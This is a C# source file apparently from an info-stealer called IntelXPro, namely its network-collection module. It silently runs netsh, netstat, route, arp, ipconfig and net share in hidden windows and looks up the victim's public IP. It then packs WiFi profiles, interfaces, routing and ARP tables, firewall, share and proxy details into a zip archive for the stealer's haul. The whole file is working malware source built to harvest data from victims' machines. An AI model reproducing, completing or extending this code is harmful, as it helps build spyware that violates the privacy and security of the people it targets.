using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Dependencies.General;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Network
{
    internal class Network : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Network Information";
            
            StringBuilder networkInfo = new StringBuilder();
            networkInfo.AppendLine("[Network Information]");
            networkInfo.AppendLine($"Collected at: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
            networkInfo.AppendLine();

            CollectBasicNetworkInfo(networkInfo);
            CollectNetworkInterfaces(networkInfo);
            CollectWiFiProfiles(networkInfo);
            CollectRoutingTable(networkInfo);
            CollectArpTable(networkInfo);
            CollectDnsInfo(networkInfo);
            CollectFirewallInfo(networkInfo);
            CollectNetworkShares(networkInfo);
            CollectProxySettings(networkInfo);

            if (networkInfo.Length > 0)
            {
                string targetPath = "Network\\network_information.txt";
                zip.AddTextFile(targetPath, networkInfo.ToString());
                counterApplications.Files.Add("Network Information => " + targetPath);
            }

            CollectNetworkConnectionsToSeparateFile(zip, counterApplications);

            if (counterApplications.Files.Count > 0)
            {
                counterApplications.Files.Add("Network\\");
                counter.Applications.Add(counterApplications);
            }
        }

        private void CollectBasicNetworkInfo(StringBuilder sb)
        {
            try
            {
                sb.AppendLine("[Basic Network Info]");
                sb.AppendLine($"Computer Name: {Environment.MachineName}");
                sb.AppendLine($"User Domain: {Environment.UserDomainName}");
                
                string publicIp = IpApi.GetPublicIp();
                sb.AppendLine($"Public IP: {publicIp}");
                
                sb.AppendLine();
            }
            catch (Exception ex)
            {
                sb.AppendLine($"Error collecting basic network info: {ex.Message}");
                sb.AppendLine();
            }
        }

        private void CollectNetworkInterfaces(StringBuilder sb)
        {
            try
            {
                sb.AppendLine("[Network Interfaces]");
                NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
                
                foreach (NetworkInterface ni in interfaces)
                {
                    sb.AppendLine($"Interface: {ni.Name}");
                    sb.AppendLine($"  Description: {ni.Description}");
                    sb.AppendLine($"  Type: {ni.NetworkInterfaceType}");
                    sb.AppendLine($"  Status: {ni.OperationalStatus}");
                    sb.AppendLine($"  Speed: {ni.Speed} bps");
                    sb.AppendLine($"  MAC Address: {ni.GetPhysicalAddress()}");
                    
                    IPInterfaceProperties ipProps = ni.GetIPProperties();
                    
                    foreach (UnicastIPAddressInformation ip in ipProps.UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            sb.AppendLine($"  IPv4: {ip.Address}");
                            sb.AppendLine($"  Subnet: {ip.IPv4Mask}");
                        }
                        else if (ip.Address.AddressFamily == AddressFamily.InterNetworkV6)
                        {
                            sb.AppendLine($"  IPv6: {ip.Address}");
                        }
                    }
                    
                    foreach (GatewayIPAddressInformation gateway in ipProps.GatewayAddresses)
                    {
                        sb.AppendLine($"  Gateway: {gateway.Address}");
                    }
                    
                    foreach (IPAddress dns in ipProps.DnsAddresses)
                    {
                        sb.AppendLine($"  DNS: {dns}");
                    }
                    
                    sb.AppendLine();
                }
            }
            catch (Exception ex)
            {
                sb.AppendLine($"Error collecting network interfaces: {ex.Message}");
                sb.AppendLine();
            }
        }

        private void CollectWiFiProfiles(StringBuilder sb)
        {
            try
            {
                sb.AppendLine("[WiFi Profiles]");
                
                using (Process process = new Process())
                {
                    process.StartInfo.FileName = "netsh";
                    process.StartInfo.Arguments = "wlan show profiles";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    
                    sb.AppendLine(output);
                }
                
                sb.AppendLine();
            }
            catch (Exception ex)
            {
                sb.AppendLine($"Error collecting WiFi profiles: {ex.Message}");
                sb.AppendLine();
            }
        }

        private void CollectNetworkConnectionsToSeparateFile(InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            try
            {
                StringBuilder connectionsInfo = new StringBuilder();
                connectionsInfo.AppendLine("[Active Network Connections]");
                connectionsInfo.AppendLine($"Collected at: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
                connectionsInfo.AppendLine();
                
                using (Process process = new Process())
                {
                    process.StartInfo.FileName = "netstat";
                    process.StartInfo.Arguments = "-an";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    
                    connectionsInfo.AppendLine(output);
                }
                
                string targetPath = "Network\\active_connections.txt";
                zip.AddTextFile(targetPath, connectionsInfo.ToString());
                counterApplications.Files.Add("Active Network Connections => " + targetPath);
            }
            catch (Exception ex)
            {
                StringBuilder errorInfo = new StringBuilder();
                errorInfo.AppendLine("[Active Network Connections]");
                errorInfo.AppendLine($"Error collecting network connections: {ex.Message}");
                
                string targetPath = "Network\\active_connections.txt";
                zip.AddTextFile(targetPath, errorInfo.ToString());
                counterApplications.Files.Add("Active Network Connections (Error) => " + targetPath);
            }
        }

        private void CollectNetworkConnections(StringBuilder sb)
        {
            try
            {
                sb.AppendLine("[Active Network Connections]");
                
                using (Process process = new Process())
                {
                    process.StartInfo.FileName = "netstat";
                    process.StartInfo.Arguments = "-an";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    
                    sb.AppendLine(output);
                }
                
                sb.AppendLine();
            }
            catch (Exception ex)
            {
                sb.AppendLine($"Error collecting network connections: {ex.Message}");
                sb.AppendLine();
            }
        }

        private void CollectRoutingTable(StringBuilder sb)
        {
            try
            {
                sb.AppendLine("[Routing Table]");
                
                using (Process process = new Process())
                {
                    process.StartInfo.FileName = "route";
                    process.StartInfo.Arguments = "print";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    
                    sb.AppendLine(output);
                }
                
                sb.AppendLine();
            }
            catch (Exception ex)
            {
                sb.AppendLine($"Error collecting routing table: {ex.Message}");
                sb.AppendLine();
            }
        }

        private void CollectArpTable(StringBuilder sb)
        {
            try
            {
                sb.AppendLine("[ARP Table]");
                
                using (Process process = new Process())
                {
                    process.StartInfo.FileName = "arp";
                    process.StartInfo.Arguments = "-a";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    
                    sb.AppendLine(output);
                }
                
                sb.AppendLine();
            }
            catch (Exception ex)
            {
                sb.AppendLine($"Error collecting ARP table: {ex.Message}");
                sb.AppendLine();
            }
        }

        private void CollectDnsInfo(StringBuilder sb)
        {
            try
            {
                sb.AppendLine("[DNS Information]");
                
                using (Process process = new Process())
                {
                    process.StartInfo.FileName = "ipconfig";
                    process.StartInfo.Arguments = "/all";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    
                    sb.AppendLine(output);
                }
                
                sb.AppendLine();
            }
            catch (Exception ex)
            {
                sb.AppendLine($"Error collecting DNS info: {ex.Message}");
                sb.AppendLine();
            }
        }

        private void CollectFirewallInfo(StringBuilder sb)
        {
            try
            {
                sb.AppendLine("[Firewall Status]");
                
                using (Process process = new Process())
                {
                    process.StartInfo.FileName = "netsh";
                    process.StartInfo.Arguments = "advfirewall show allprofiles";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    
                    sb.AppendLine(output);
                }
                
                sb.AppendLine();
            }
            catch (Exception ex)
            {
                sb.AppendLine($"Error collecting firewall info: {ex.Message}");
                sb.AppendLine();
            }
        }

        private void CollectNetworkShares(StringBuilder sb)
        {
            try
            {
                sb.AppendLine("[Network Shares]");
                
                using (Process process = new Process())
                {
                    process.StartInfo.FileName = "net";
                    process.StartInfo.Arguments = "share";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    
                    sb.AppendLine(output);
                }
                
                sb.AppendLine();
            }
            catch (Exception ex)
            {
                sb.AppendLine($"Error collecting network shares: {ex.Message}");
                sb.AppendLine();
            }
        }

        private void CollectProxySettings(StringBuilder sb)
        {
            try
            {
                sb.AppendLine("[Proxy Settings]");
                
                using (Process process = new Process())
                {
                    process.StartInfo.FileName = "netsh";
                    process.StartInfo.Arguments = "winhttp show proxy";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    
                    sb.AppendLine(output);
                }
                
                sb.AppendLine();
            }
            catch (Exception ex)
            {
                sb.AppendLine($"Error collecting proxy settings: {ex.Message}");
                sb.AppendLine();
            }
        }
    }
}
